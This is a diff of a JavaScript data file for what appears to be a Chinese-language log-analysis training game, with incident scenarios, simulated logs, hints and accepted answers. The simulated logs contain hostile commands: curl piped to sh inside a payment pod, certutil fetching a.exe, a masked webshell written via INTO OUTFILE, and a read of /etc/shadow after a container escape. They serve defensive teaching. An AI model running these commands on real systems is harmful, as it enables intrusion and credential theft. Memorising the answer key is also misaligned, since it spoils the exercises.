+      '03:01:10,"root@203.0.113.88","QUERY: SELECT \'<?php /*payload-masked*/ ?>\' INTO OUTFILE \'/var/www/html/uploads/x.php\'"',
+      '03:01:12,"root@203.0.113.88","QUERY: SELECT \'OK\' INTO OUTFILE \'/var/www/html/uploads/x.php\'"',
+      '03:02:00,"root@203.0.113.88","QUERY: SELECT @@version"',
+    ]},
+    tasks: [
+      { q: '被写出的 Webshell 完整路径', hint: 'grep OUTFILE /logs/mysql_audit.csv', ans: ['/var/www/html/uploads/x.php'], teach: '🧪 SELECT ... INTO OUTFILE 是 MySQL 写文件能力，secure_file_priv 为空时最危险（载荷内容已脱敏）。' },
+      { q: '写马动作的定性（输 check 两个字）', hint: '往 Web 目录写可执行脚本=?', ans: ['写马', 'webshell', '后门'], teach: '💉 数据库→Web 目录的跨越=把数据库漏洞升级成服务器失陷。' },
+      { q: '攻击者最先确认的数据库配置项（输 check 变量名）', hint: '第一条 QUERY 里 LIKE 的那个词', ans: ['secure_file_priv'], teach: '🔎 攻击者先查"能不能写文件"再动手——高手作案也讲流程。' },
+    ],
+    victory: ['结论：root 经 INTO OUTFILE 向 Web 目录写入 x.php 一句话木马。', '根除：删文件 → 设 secure_file_priv=NULL → 数据库账号最小权限。'] },
+
+  /* ========== ⑦ 邮件网关日志 ========== */
+  { id: 'm1', ico: '📧', title: '邮件日志 · 钓鱼群发', cat: '邮件网关日志', diff: 1,
+    brief: '同一主题的邮件如潮水般涌来，好在网关拦了大半。',
+    files: { '/logs/mailgw.log': [
+      '02:00:01 FROM invoice-notice.cn RCPT=56 ACTION=QUARANTINE subject="电子发票-请查收"',
+      '02:00:01 FROM invoice-notice.cn RCPT=48 ACTION=QUARANTINE subject="电子发票-请查收"',
+      '02:00:02 FROM invoice-notice.cn RCPT=31 ACTION=QUARANTINE subject="电子发票-请查收"',
+      '02:00:03 FROM invoice-notice.cn RCPT=1 ACTION=DELIVERED subject="电子发票-请查收" to=hr02',
+    ]},
+    tasks: [
+      { q: '仿冒发件域名', hint: 'grep QUARANTINE /logs/mailgw.log', ans: ['invoice-notice.cn'], teach: '📧 136 封同主题邮件从一个域名群发——标准钓鱼 Campaign。' },
+      { q: '该 Campaign 的总收件人数（输 check 数字）', hint: '56+48+31+1', ans: ['136'], teach: '🔢 数量级决定处置规模：全员通报 vs 点对点排查。' },
+      { q: '有一封漏网送到了谁手里（输 check 用户名）', hint: 'grep DELIVERED /logs/mailgw.log', ans: ['hr02'], teach: '🚨 拦截率 99% 也必须追那 1%——找到 hr02 提醒"别点附件"。' },
+    ],
+    victory: ['结论：invoice-notice.cn 群发钓鱼 136 封，135 封拦截，1 封到达 hr02。', '处置：撤回+提醒 hr02+域名拉黑+通报全员。'] },
+
+  { id: 'm2', ico: '🧧', title: '邮件日志 · BEC 假 CFO', cat: '邮件网关日志', diff: 2,
+    brief: '一封"高管"邮件穿过了网关，收件人是财务。',
+    files: { '/logs/mailgw.log': [
+      '11:02:00 FROM cfo@corpf-cfo.com RCPT=1 ACTION=DELIVERED subject="紧急：供应商账户变更" to=xiaolin',
+      '11:02:00 SPF: fail (corpf-cfo.com 未授权发信)',
+      '11:05:00 FROM cfo@corpf-cfo.com RCPT=1 ACTION=DELIVERED subject="RE: 紧急：供应商账户变更" to=xiaolin',
+    ]},
+    tasks: [
+      { q: '仿冒发件域名', hint: 'grep DELIVERED /logs/mailgw.log 看 FROM', ans: ['corpf-cfo.com'], teach: '🎭 官方是 corpf.com，仿冒多个 -cfo。SPF fail 就是"身份存疑"的技术实锤。' },
+      { q: '收件人（输 check 用户名）', hint: '看 to= 字段', ans: ['xiaolin'], teach: '🎯 财务专人被点名——BEC 都做功课，攻击者知道找谁。' },
+      { q: 'SPF 校验结果（大写英文）', hint: '邮件头那一行', ans: ['fail'], teach: '📮 SPF fail=发信服务器不在官方白名单。DMARC 设 p=reject 能直接拒收。' },
+    ],
+    victory: ['结论：corpf-cfo.com 仿冒 CFO 的两封邮件送达财务 xiaolin（SPF fail）。', '处置：提醒中止付款+回拨核实+推进 DMARC p=reject。'] },
+
+  { id: 'm3', ico: '🪤', title: '邮件日志 · 附件投递链', cat: '邮件网关日志', diff: 3,
+    brief: '一封带"简历"附件的邮件送达了 HR，上网行为日志里紧接着有了下文……',
+    files: {
+      '/logs/mailgw.log': [
+        '14:00:01 FROM recruit@job-elite-hr.cn RCPT=1 ACTION=DELIVERED to=hr02 subject="恭喜进入终面" attach="简历.pdf.exe"',
+      ],
+      '/logs/proxy_access.log': [
+        '14:03:11 hr02 GET http://evil-drop.top/dl/client.exe -> 200 (downloaded 12MB)',
+        '14:05:40 hr02 POST http://evil-drop.top/beacon -> 200 (periodic)',
+        '14:06:00 zhangwei GET https://www.baidu.com',
+      ],
+    },
+    tasks: [
+      { q: '打开邮件并下载载荷的用户', hint: 'cat /logs/proxy_access.log 看第一条的账号', ans: ['hr02'], teach: '🪤 邮件日志(投递) + 代理日志(下载) 两段拼接=完整投递链。单看一段都会漏。' },
+      { q: '伪装成简历的附件名', hint: 'grep attach /logs/mailgw.log', ans: ['简历.pdf.exe'], teach: '🎭 双后缀：系统只显示"简历.pdf"，.exe 藏在后面。' },
+      { q: '载荷下载与心跳的域名', hint: 'grep "evil" /logs/proxy_access.log', ans: ['evil-drop.top'], teach: '📞 下载(14:03)+心跳(14:05 周期性 POST)=木马已上线。封域名+隔离终端。' },
+    ],
+    victory: ['结论：hr02 打开简历.pdf.exe 并下载载荷，木马经 evil-drop.top 心跳上线。', '处置：隔离 hr02 终端 → 重置其凭据 → 网关撤回同 Campaign。'] },
+
+  /* ========== ⑧ 应用/业务日志 ========== */
+  { id: 'a1', ico: '🔁', title: '业务日志 · 撞库攻击', cat: '应用业务日志', diff: 1,
+    brief: '登录接口的失败记录里，同一个 IP 换着账号试……',
+    files: { '/logs/app_login.log': [
+      '02:00:01 LOGIN user=zhangwei ip=45.33.32.156 result=FAIL',
+      '02:00:02 LOGIN user=lisi ip=45.33.32.156 result=FAIL',
+      '02:00:02 LOGIN user=wangfang ip=45.33.32.156 result=FAIL',
+      '02:00:03 LOGIN user=chenbo ip=45.33.32.156 result=FAIL',
+      '02:00:04 LOGIN user=hr02 ip=45.33.32.156 result=FAIL',
+      '02:00:05 LOGIN user=wangfang ip=45.33.32.156 result=OK',
+      '02:00:06 LOGIN user=test01 ip=45.33.32.156 result=FAIL',
+    ]},
+    tasks: [
+      { q: '撞库来源 IP', hint: 'grep FAIL /logs/app_login.log', ans: ['45.33.32.156'], teach: '🔁 同 IP 换不同用户名试密码=撞库（拿别处泄露的密码来试）。' },
+      { q: '被试出（登录成功）的账号', hint: 'grep "result=OK" /logs/app_login.log', ans: ['wangfang'], teach: '🎯 撞库成功=该用户在别处泄露过同款密码。强制改密+下线。' },
+      { q: '攻击者总共尝试的失败次数（输 check 数字）', hint: '数 FAIL 行', ans: ['6', '六'], teach: '🔢 撞库特征：失败多、账号杂、来源单一。对策：各站不同密码+登录限速。' },
+    ],
+    victory: ['结论：45.33.32.156 对 7 个账号撞库，wangfang 被试出。', '处置：冻结 wangfang 会话+强制改密+来源封禁。'] },
+
+  { id: 'a2', ico: '🌍', title: '业务日志 · VPN 时空矛盾', cat: '应用业务日志', diff: 2,
+    brief: '同一个账号，五分钟内出现在两个不可能同时存在的城市。',
+    files: { '/logs/vpn_session.log': [
+      '09:00:00 LOGIN user=lisi loc=Beijing,CN ip=10.1.5.7 device=iPhone15 dev_id=D8899',
+      '09:05:00 LOGIN user=lisi loc=Frankfurt,DE ip=45.83.90.12 device=unknown',
+      '09:06:00 ACCESS user=lisi res=/files/salary_2026.xlsx action=DOWNLOAD',
+      '09:08:00 LOGIN user=zhangwei loc=Beijing,CN ip=10.1.5.7 device=iPhone15 dev_id=D8899',
+    ]},
+    tasks: [
+      { q: '被盗用的账号', hint: 'cat /logs/vpn_session.log 找两地登录的用户', ans: ['lisi'], teach: '🌍 物理上不可能的两地登录=账号被盗的高置信证据。' },
+      { q: '境外登录会话下载的敏感文件名', hint: 'grep DOWNLOAD /logs/vpn_session.log', ans: ['salary_2026.xlsx'], teach: '📥 登录后直奔薪酬文件——目标明确的数据窃取。' },
+      { q: '两次登录的间隔（分钟，输 check 数字）', hint: '09:00 与 09:05', ans: ['5', '五'], teach: '⏱️ 间隔 5 分钟——VPN 登录+敏感下载的速度快过任何人工核实流程，必须自动拦截。' },
+    ],
+    victory: ['结论：lisi 账号被境外登录并下载薪酬文件（与北京会话仅隔 5 分钟）。', '处置：强制下线+冻结+密码重置+核实 09:06 的下载记录。'] },
+
+  { id: 'a3', ico: '🔓', title: '业务日志 · 越权遍历', cat: '应用业务日志', diff: 3,
+    brief: '某用户的接口访问从"查自己"变成了"挨个翻别人"。',
+    files: { '/logs/oa_access.log': [
+      '10:00:00 user=zhangwei GET /api/employee?id=1001 (本人) 200',
+      '10:01:10 user=zhangwei GET /api/employee?id=1042 200',
+      '10:01:11 user=zhangwei GET /api/employee?id=1043 200',
+      '10:01:12 user=zhangwei GET /api/employee?id=1044 200',
+      '10:01:30 user=zhangwei GET /api/employee?id=1050 200',
+      '10:02:00 user=lisi GET /api/employee?id=1001 (本人) 200',
+    ]},
+    tasks: [
+      { q: '越权访问的用户', hint: 'cat /logs/oa_access.log 看 1042 之后还在查的账号', ans: ['zhangwei'], teach: '🔓 1001 是本人，1042-1050 是别人——服务端没校验"数据属主"，水平越权。' },
+      { q: '被遍历的最大员工 ID（输 check 数字）', hint: '看最后一条 employee 查询', ans: ['1050'], teach: '🔢 从 1042 连续递增到 1050=脚本化遍历，一次拉走 9 份他人档案。' },
+      { q: '这个漏洞的根因（输 check：服务端缺什么校验）', hint: '改 id 参数就能看别人数据=缺？', ans: ['属主', '归属', '权限', '鉴权', '校验'], teach: '🏛️ 垂直越权看角色，水平越权看属主。服务端必须校验"这条数据是不是你的"。' },
+    ],
+    victory: ['结论：zhangwei 借未校验属主的接口遍历 id=1042~1050 的他人档案。', '修复：接口加数据属主校验+单用户查询频控+越权审计。'] },
+
+  /* ========== ⑨ VPN 接入日志 ========== */
+  { id: 'v1', ico: '🌐', title: 'VPN 日志 · 多地爆发登录', cat: 'VPN 接入日志', diff: 1,
+    brief: '一个运维账号一小时内出现在三个国家——人不可能瞬移。',
+    files: { '/logs/vpn_auth.csv': [
+      'ts,user,country,ip,result',
+      '20:00:00,ops01,China,10.1.5.7,OK',
+      '20:31:00,ops01,Germany,45.83.90.12,OK',
+      '20:52:00,ops01,Brazil,196.52.43.7,OK',
+      '21:10:00,ops01,Germany,45.83.90.12,OK',
+      '21:30:00,zhangwei,China,10.1.5.9,OK',
+    ]},
+    tasks: [
+      { q: '被盗用的账号', hint: 'cat /logs/vpn_auth.csv 看一小时三国的用户', ans: ['ops01'], teach: '🌍 一小时三国在物理上不可能——典型的凭据被盗后自动化登录。' },
+      { q: '最早的异常登录国家（英文）', hint: '看 20:31 那条', ans: ['germany', '德国'], teach: '📍 最早异常点是攻击者拿到密码的第一刻，常用于定位泄露时间。' },
+      { q: '这类事件的定性（输 check 两个字）', hint: '密码从别处泄露来试 VPN=?', ans: ['盗号', '撞库', '盗用'], teach: '🔁 撞库/盗号的对策：MFA+异地二次验证+泄露密码监控。' },
+    ],
+    victory: ['结论：ops01 凭据泄露，1 小时内被德国/巴西两地登录。', '处置：强制下线+改密+撤销全部会话+排查异地会话的下载行为。'] },
+
+  { id: 'v2', ico: '📲', title: 'VPN 日志 · MFA 疲劳攻击', cat: 'VPN 接入日志', diff: 2,
+    brief: '深夜 47 次推送轰炸后，用户终于手滑点了"允许"。',
+    files: { '/logs/vpn_mfa.csv': [
+      '23:40:01 LOGIN user=hr02 pass=OK mfa=PUSH sent',
+      '23:40:31 mfa=PUSH sent (第 5 次)',
+      '23:45:00 mfa=PUSH sent (第 12 次)',
+      '23:50:00 mfa=PUSH sent (第 20 次)',
+      '23:52:10 mfa=PUSH result=ALLOWED by user (第 27 次)',
+      '23:52:15 LOGIN user=hr02 result=OK session=established',
+    ]},
+    tasks: [
+      { q: '这种攻击手法叫什么（输 check：MFA+两字）', hint: '几十次推送轰炸到你点允许为止', ans: ['mfa疲劳', '疲劳', '轰炸', '推送疲劳'], teach: '📲 MFA 疲劳（推送轰炸）：赌你深夜烦了手滑点允许。对策：号码匹配/数字匹配 MFA。' },
+      { q: '攻击者总共发起了多少次推送（输 check 数字）', hint: '最后一次是第 27 次，前面试了多少次？', ans: ['27', '二十七'], teach: '🔢 27 次推送终于命中一次——MFA 疲劳的命中率完全靠"烦"出来的。' },
+      { q: '攻击者最终拿到了什么（输 check：已建立的___）', hint: '23:52:15 那行', ans: ['session', '会话', 'vpn'], teach: '🔑 拿到的是合法会话——之后所有行为都"看起来像正常登录"，必须撤销会话而非只改密码。' },
+    ],
+    victory: ['结论：hr02 遭 MFA 疲劳攻击，第 27 次推送被误点允许，攻击者建立 VPN 会话。', '处置：立即终止会话+改密+更换为数字匹配 MFA。'] },
+
+  { id: 'v3', ico: '📦', title: 'VPN 日志 · 离职账号仍在活跃', cat: 'VPN 接入日志', diff: 3,
+    brief: '人事系统里他 9 月 1 日就离职了，VPN 日志里他 9 月 5 日还在登录……',
+    files: { '/logs/vpn_auth.csv': [
+      '09:01:00 LOGIN user=lilei loc=Beijing ip=10.1.5.7 result=OK',
+      '09:05:22 LOGIN user=lilei loc=Beijing ip=111.199.10.5 result=OK  (家庭宽带)',
+      '09:05:30 ACCESS user=lilei res=/proj/clients.csv action=DOWNLOAD',
+      '09:06:00 ACCESS user=lilei res=/proj/pricing_v9.docx action=DOWNLOAD',
+      '09:07:00 LOGIN user=hr02 loc=Beijing ip=10.1.5.7 result=OK',
+    ],
+    '/logs/hr_offboard.csv': [
+      'employee,team,last_day,account_status',
+      'lilei,销售部,2026-09-01,active（未禁用！）',
+      'wangfang,人事部,2026-08-15,disabled',
+    ]},
+    tasks: [
+      { q: '离职后仍登录的违规账号', hint: '对比两份文件找"已离职但还活跃"的人', ans: ['lilei'], teach: '📦 离职账号未禁用=最容易被忽略的后门，也是数据外带高发期。' },
+      { q: '他的最后工作日（月-日）', hint: '看 hr_offboard.csv', ans: ['09-01', '2026-09-01'], teach: '📅 权限回收应在最后工作日当天完成，而非"以后再说"。' },
+      { q: '根因是流程缺了哪一步（输 check 两个字）', hint: '账号状态一栏写着什么？', ans: ['禁用', '回收', '注销'], teach: '🏛️ 离职流程必须有"账号禁用+权限回收"卡点，HR 与 IT 联动。' },
+    ],
+    victory: ['结论：lilei 离职 4 天后仍登录并下载客户名单与定价文档。', '处置：立即禁用+审计其全部下载+法律评估+补流程卡点。'] },
+
+  /* ========== ⑩ 云平台审计日志 ========== */
+  { id: 'c1', ico: '☁️', title: '云审计 · AccessKey 泄露外联', cat: '云平台审计日志', diff: 1,
+    brief: '云审计日志里，一把"只该在服务器上用"的钥匙从境外开了门。',
+    files: { '/logs/cloud_audit.csv': [
+      'ts,access_key,event,src,detail',
+      '02:00:01,AKIAIOSFODNN7,ListBuckets,10.1.2.40,正常业务',
+      '03:12:00,AKIAIOSFODNN7,ListBuckets,45.83.90.12,境外 IDC',
+      '03:12:05,AKIAIOSFODNN7,GetObject s3://backup-db/full.sql,45.83.90.12,下载 2.1GB',
+      '03:13:00,AKIAIOSFODNN7,CreateUser new-user=hx1,45.83.90.12,⚠️ 创建子账号',
+    ]},
+    tasks: [
+      { q: '泄露的 AccessKey ID', hint: 'cat /logs/cloud_audit.csv', ans: ['AKIAIOSFODNN7'], teach: '☁️ AK 泄露=拿着你的云身份进门。硬编码在代码仓库/前端是最常见泄露源。' },
+      { q: '异常调用的来源 IP', hint: '看 03:12 之后的 src 列', ans: ['45.83.90.12'], teach: '🌍 正常在 10.1.2.40、异常在境外 IDC——同一把钥匙两个世界。' },
+      { q: '攻击者做的最危险动作', hint: '看 detail 列那条带 ⚠️ 的', ans: ['createuser', '创建用户', '创建子账号'], teach: '🔥 拖库只是开始，创建持久化子账号才是"长期占有"。密钥泄露必须轮换+审计子账号。' },
+    ],
+    victory: ['结论：AKIAIOSFODNN7 泄露，境外拖走 2.1GB 数据库备份并创建持久化子账号。', '处置：立即轮换密钥 → 删子账号 → 核对对象存储访问清单 → 代码仓库扫硬编码。'] },
+
+  { id: 'c2', ico: '🧱', title: '云审计 · 安全组被全放开', cat: '云平台审计日志', diff: 2,
+    brief: '凌晨三点，有人把 22 端口对全宇宙开放了。',
+    files: { '/logs/cloud_audit.csv': [
+      '03:00:01,ops01@console,AuthorizeSecurityGroupEntry,sg-01,协议=TCP 端口=22 来源=0.0.0.0/0',
+      '03:00:40,ops01@console,AuthorizeSecurityGroupEntry,sg-01,协议=TCP 端口=3389 来源=0.0.0.0/0',
+      '03:05:00,system,ConfigChange,sg-01,变更前: 22 仅限 10.0.0.0/8',
+      '06:00:00,system,ScanDetected,sg-01,22 端口遭外网扫描 ×2300',
+    ]},
+    tasks: [
+      { q: '被对全网开放的端口（输 check 数字）', hint: 'grep "0.0.0.0" /logs/cloud_audit.csv 看端口字段', ans: ['22', '3389'], teach: '🧱 22/3389 对 0.0.0.0/0 开放=把爆破面直接焊在大门外。' },
+      { q: '授权来源（表示"任何地址"）', hint: '那个经典的四零写法', ans: ['0.0.0.0/0'], teach: '🌐 0.0.0.0/0=全世界。云上安全组变更必须有审批+自动回收。' },
+      { q: '事件定性（输 check 四个字）', hint: '这不是攻击，是运维把门拆了', ans: ['配置错误', '误配置', '错误配置'], teach: '⚙️ OWASP A05 安全配置错误——云上最常见的事故源头。扫描 2300 次就是后果。' },
+    ],
+    victory: ['结论：ops01 凌晨将 22/3389 对全网开放，6 小时内被扫描 2300 次。', '处置：立即收紧安全组 → 审计该时段登录 → 推进安全组自动基线检测。'] },
+
+  { id: 'c3', ico: '🧑‍💼', title: '云审计 · 控制台凭空建号', cat: '云平台审计日志', diff: 3,
+    brief: 'RAM 审计里多了一个拥有最高权限的新用户——创建者不是任何人。',
+    files: { '/logs/cloud_audit.csv': [
+      'ts,user,event,src,detail',
+      '03:20:00,ops01@console,CreateRAMUser,10.1.5.7,name=migrate-tmp（已审批）',
+      '03:47:00,??,CreateRAMUser,45.83.90.12,name=hx-support',
+      '03:47:10,??,AttachPolicy,45.83.90.12,hx-support += AdministratorAccess',
+      '03:48:00,??,CreateAccessKey,45.83.90.12,for hx-support',
+      '03:49:00,hx-support,ListInstances,45.83.90.12,开始摸排资产',
+    ]},
+    tasks: [
+      { q: '被凭空创建的用户名', hint: '找 src 为境外 IP 的 CreateRAMUser', ans: ['hx-support'], teach: '🧑‍💼 名字装成"支持团队"——云上建号+提权+发钥匙三连=持久化接管。' },
+      { q: '给它挂载的策略名', hint: 'grep Administrator /logs/cloud_audit.csv', ans: ['administratoraccess', 'administrator'], teach: '👑 AdministratorAccess=云上上帝权限。策略挂载必须双人审批。' },
+      { q: '操作者来源 IP', hint: '看那几条的 src 列', ans: ['45.83.90.12'], teach: '🌍 控制台操作来自境外 IDC——主账号/运维账号已失陷。' },
+    ],
+    victory: ['结论：控制台凭据失陷，境外创建 hx-support 并授予 AdministratorAccess。', '处置：删用户/密钥 → 重置控制台凭据+MFA → 全量审计该 IP 的操作。'] },
+
+  /* ========== ⑪ 容器审计日志 ========== */
+  { id: 'k1', ico: '📦', title: 'K8s 审计 · 特权容器', cat: '容器审计日志', diff: 1,
+    brief: '开发随手起了一个"调试用"的容器——带上帝模式的那种。',
+    files: { '/logs/k8s_audit.csv': [
+      'ts,user,verb,resource,ns,detail',
+      '14:00:00,dev01,create,pod,default,name=debug-tool privileged=true hostPID=true',
+      '14:01:00,dev01,exec,pod/default/debug-tool,cmd=bash',
+      '14:02:00,dev01,exec,pod/default/debug-tool,cmd=ls /host',
+      '15:00:00,cicd-bot,create,pod,default,name=api-v1.2.3 privileged=false',
+    ]},
+    tasks: [
+      { q: '以特权模式创建的 Pod 名', hint: 'grep privileged /logs/k8s_audit.csv', ans: ['debug-tool'], teach: '📦 privileged=true = 容器拥有近乎宿主机的全部权限，等于把钥匙插门上。' },
+      { q: '那个危险的能力字段名', hint: 'detail 里代表"特权"的词', ans: ['privileged'], teach: '⚙️ privileged + hostPID 组合基本等于宿主机 root。生产集群应默认拒绝。' },
+      { q: '创建者账号', hint: '看 user 列', ans: ['dev01'], teach: '👤 开发"顺手"起特权容器是真实世界容器失陷的高频起点。' },
+    ],
+    victory: ['结论：dev01 创建特权容器 debug-tool 并 exec 进去查看宿主机。', '整改：PSP/OPA 禁 privileged + exec 审计 + 最小权限运行时。'] },
+
+  { id: 'k2', ico: '🧲', title: 'K8s 审计 · 挂载宿主机根目录', cat: '容器审计日志', diff: 2,
+    brief: '一个"备份"Pod 把宿主机的整个根目录挂了进去……',
+    files: { '/logs/k8s_audit.csv': [
+      '03:00:00,svc-backup,create,pod,kube-system,name=backup-runner volumes=[hostPath:/]',
+      '03:00:10,svc-backup,exec,pod/kube-system/backup-runner,cmd=chroot /host bash',
+      '03:01:00,svc-backup,exec,pod/kube-system/backup-runner,cmd=cat /host/etc/shadow',
+      '03:05:00,cicd-bot,create,pod,default,name=api-v2.0 privileged=false',
+    ]},
+    tasks: [
+      { q: '被挂载进容器的宿主机路径', hint: 'grep hostPath /logs/k8s_audit.csv', ans: ['/', 'hostpath'], teach: '🧲 hostPath:/ = 容器里看到的就是宿主机整个文件系统，容器边界直接消失。' },
+      { q: '这个行为的危险定性（输 check 四个字）', hint: '容器看到宿主根目录，下一步就是？', ans: ['容器逃逸', '逃逸'], teach: '🕳️ 容器逃逸：从隔离环境跨进宿主机。chroot /host + 读 shadow 就是逃逸动作。' },
+      { q: '攻击者读走的敏感文件（输 check 文件名）', hint: 'exec 里的 cat 目标', ans: ['shadow', '/etc/shadow'], teach: '🔐 shadow 里有全部密码哈希——抓去离线爆破就是全域密码。' },
+    ],
+    victory: ['结论：backup-runner 挂载宿主根目录并读取 shadow——事实上的容器逃逸。', '处置：删 Pod → 宿主机视为失陷 → 全量凭据轮换 → hostPath 策略收紧。'] },
+
+  { id: 'k3', ico: '🐝', title: 'K8s 审计 · CI 账号进生产容器', cat: '容器审计日志', diff: 3,
+    brief: '凌晨三点，CI 机器人"走进"了支付容器，还下载了点东西。',
+    files: { '/logs/k8s_audit.csv': [
+      '03:10:00,cicd-bot,exec,pod/prod/payment-api,cmd=curl -s http://update-svc.xyz/x|sh',
+      '03:10:30,cicd-bot,exec,pod/prod/payment-api,cmd=cat /etc/podinfo/token',
+      '03:11:00,cicd-bot,create,pod/prod/exfil-helper,hostNetwork=true',
+      '03:11:20,exfil-helper,net,OUTBOUND,45.60.40.10:8443 上传 3MB',
+    ]},
+    tasks: [
+      { q: '被"进入"的生产服务名', hint: 'grep exec /logs/k8s_audit.csv 看第一条', ans: ['payment-api'], teach: '🐝 kubectl exec 是运维正常操作——但凌晨三点由 CI 账号对支付容器执行，基线完全不符。' },
+      { q: '执行的危险命令关键词（输 check 命令名）', hint: '远程脚本直接管道给 shell', ans: ['curl'], teach: '⬇️ curl|sh 在容器里一样致命，还更容易被误当成 CI 行为。' },
+      { q: '攻击者拿走的云原生凭据（输 check：容器里的___）', hint: 'cat /etc/podinfo/token', ans: ['token', 'satoken', 'serviceaccount'], teach: '🎟️ ServiceAccount Token 是 Pod 内置身份，泄露即可以该身份调 API。' },
+    ],
+    victory: ['结论：cicd-bot 凭据失陷，凌晨进入 payment-api 偷取 SA Token 并外传数据。', '处置：吊销 SA Token+CI 凭据轮换+exec 审计告警+出口白名单。'] },
+
+  /* ========== ⑫ 终端行为日志 ========== */
+  { id: 'e1', ico: '📎', title: '终端日志 · 宏文档攻击链', cat: '终端行为日志', diff: 1,
+    brief: 'Word 文档自己"动"了：拉起命令行、还去下载了东西。',
+    files: { '/logs/edr_behavior.csv': [
+      'ts,host,parent,child,cmdline',
+      '14:00:01,FIN-02,explorer.exe,WINWORD.EXE,"opens 面试邀请.docm"',
+      '14:00:08,FIN-02,WINWORD.EXE,cmd.exe,/c certutil -urlcache -f http://files-dl.top/a.exe %TEMP%\\a.exe',
+      '14:00:20,FIN-02,cmd.exe,a.exe,"落地 %TEMP%\\a.exe"',
+      '14:00:25,FIN-02,a.exe,net.exe,"net user /domain"',
+      '09:00:00,FIN-02,explorer.exe,chrome.exe,"正常浏览网页"',
+    ]},
+    tasks: [
+      { q: '拉起命令行的办公进程', hint: 'grep WINWORD /logs/edr_behavior.csv', ans: ['winword.exe', 'winword'], teach: '📎 办公软件的子进程是 cmd/powershell = 宏攻击铁律。正常 Word 永远不需要。' },
+      { q: '攻击者用来下载载荷的系统工具', hint: '看 cmdline 里那个 Windows 自带下载器', ans: ['certutil'], teach: '⬇️ certutil 是"LOLBAS"家族：系统自带、有签名、杀毒不拦——攻击者最爱借道。' },
+      { q: '载荷下载域名', hint: 'grep "urlcache" /logs/edr_behavior.csv', ans: ['files-dl.top'], teach: '🌐 下载域名+落地路径+后续 net user 侦察，链条完整。' },
+    ],
+    victory: ['结论：面试邀请.docm 宏拉起 certutil 下载 a.exe 并开始域内侦察。', '处置：隔离主机+撤回邮件+禁 Office 拉生子进程策略+查同 Campaign 收件人。'] },
+
+  { id: 'e2', ico: '⌨️', title: '终端日志 · 键盘记录器', cat: '终端行为日志', diff: 2,
+    brief: '有个进程在悄悄记录你敲的每一个键……',
+    files: { '/logs/edr_behavior.csv': [
+      'ts,host,process,behavior,detail',
+      '20:00:00,HR-PC-07,kbdmon.exe,SetWindowsHookEx,安装全局键盘钩子',
+      '20:00:05,HR-PC-07,kbdmon.exe,FILE_WRITE,%APPDATA%\\kbd.log 持续追加',
+      '20:30:00,HR-PC-07,kbdmon.exe,NET_POST,每 10 分钟上传 kbd.log 到 paste-log.icu',
+      '20:30:10,HR-PC-07,chrome.exe,NORMAL,"正常网页浏览"',
+    ]},
+    tasks: [
+      { q: '键盘记录进程名', hint: 'grep hook /logs/edr_behavior.csv', ans: ['kbdmon.exe'], teach: '⌨️ 全局键盘钩子是键盘记录器的标志 API（正常软件极少使用）。' },
+      { q: '记录落盘的文件名', hint: 'grep kbd.log /logs/edr_behavior.csv', ans: ['kbd.log'], teach: '📝 持续追加的 kbd.log=按时间序收集的按键记录，含密码聊天一切。' },
+      { q: '它的最终目的（输 check 四个字）', hint: '上传按键记录是为了拿什么？', ans: ['凭据窃取', '窃取凭据', '偷密码', '窃取密码'], teach: '🔐 键盘记录→凭据→横向，是入侵的标准三级跳。处置必须包含全网改密。' },
+    ],
+    victory: ['结论：HR-PC-07 感染键盘记录器，按键记录每 10 分钟外传。', '处置：隔离终端 → 删进程/计划任务 → 全员相关账号改密。'] },
+
+  { id: 'e3', ico: '✂️', title: '终端日志 · 剪贴板劫持', cat: '终端行为日志', diff: 3,
+    brief: '你复制的转账账号，到对方手里变成另一个——中间被"换"了。',
+    files: { '/logs/edr_behavior.csv': [
+      'ts,host,process,behavior,detail',
+      '11:00:00,FIN-PC-03,clipx.exe,CLIPBOARD_MONITOR,持续读取剪贴板',
+      '11:00:05,FIN-PC-03,clipx.exe,REGEX_MATCH,匹配银行账号格式 (19 位数字)',
+      '11:00:06,FIN-PC-03,clipx.exe,CLIPBOARD_REPLACE,替换为 6222***4457 (攻击者账户)',
+      '11:01:00,FIN-PC-03,explorer.exe,PASTE,财务专员粘贴了被替换的账号',
+    ]},
+    tasks: [
+      { q: '被劫持的系统功能（输 check 三个字）', hint: '复制粘贴用的那个东西', ans: ['剪贴板', 'clipboard'], teach: '✂️ 剪贴板劫持：监控复制内容并按格式替换——转账场景危害极大。' },
+      { q: '它匹配替换的目标格式（输 check 四个字）', hint: 'REGEX_MATCH 那行在找什么', ans: ['银行账号', '卡号', '账号'], teach: '🏦 正则匹配"长数字"后整体替换，肉眼几乎无法察觉。' },
+      { q: '第一处置动作（输 check 两字动词）', hint: '先让恶意程序停下', ans: ['隔离', '查杀', '断网'], teach: '🚨 先隔离终端止血，再核对近期所有转账是否被替换，最后排查感染途径。' },
+    ],
+    victory: ['结论：FIN-PC-03 感染剪贴板劫持木马，转账账号被替换为攻击者账户。', '处置：隔离查杀 → 核对在途转账 → 全员通报"粘贴前核对全名"。'] },
+
+  /* ========== ⑬ Linux 系统日志 ========== */
+  { id: 's1', ico: '🧗', title: '系统日志 · sudo 提权试探', cat: 'Linux 系统日志', diff: 1,
+    brief: '一个本不该碰 sudo 的账号，反复尝试"变强"。',
+    files: { '/var/log/secure': [
+      'Sep  6 20:00:01 app-01 sudo: deploy : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/su',
+      'Sep  6 20:00:40 app-01 sudo: deploy : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/su',
+      'Sep  6 20:01:15 app-01 sudo: deploy : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/cat /etc/shadow',
+      'Sep  6 20:02:00 app-01 sudo: deploy : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/vi /etc/crontab',
+      'Sep  6 20:03:30 app-01 sudo: deploy : 20 incorrect password attempts',
+    ]},
+    tasks: [
+      { q: '尝试提权的账号', hint: 'grep sudoers /var/log/secure', ans: ['deploy'], teach: '🧗 "NOT in sudoers"=该账号根本没权限却反复尝试提权，行为已越界。' },
+      { q: '尝试的总次数（输 check 数字）', hint: '最后一行写了', ans: ['20', '二十'], teach: '🔢 密码试了 20 次——若 deploy 密码较弱，sudo 一旦配置疏漏就完了。' },
+      { q: '它的行为定性（输 check 四个字）', hint: '普通账号想变成 root=?', ans: ['提权尝试', '权限提升'], teach: '🪜 对应 ATT&CK 权限提升战术。sudoers 白名单+失败告警能直接掐断。' },
+    ],
+    victory: ['结论：deploy 账号 20 次尝试 sudo 提权（su/cat shadow/改 crontab）。', '处置：核查 deploy 是否已失陷（它是攻击者跳板）+ 收紧 sudo 白名单。'] },
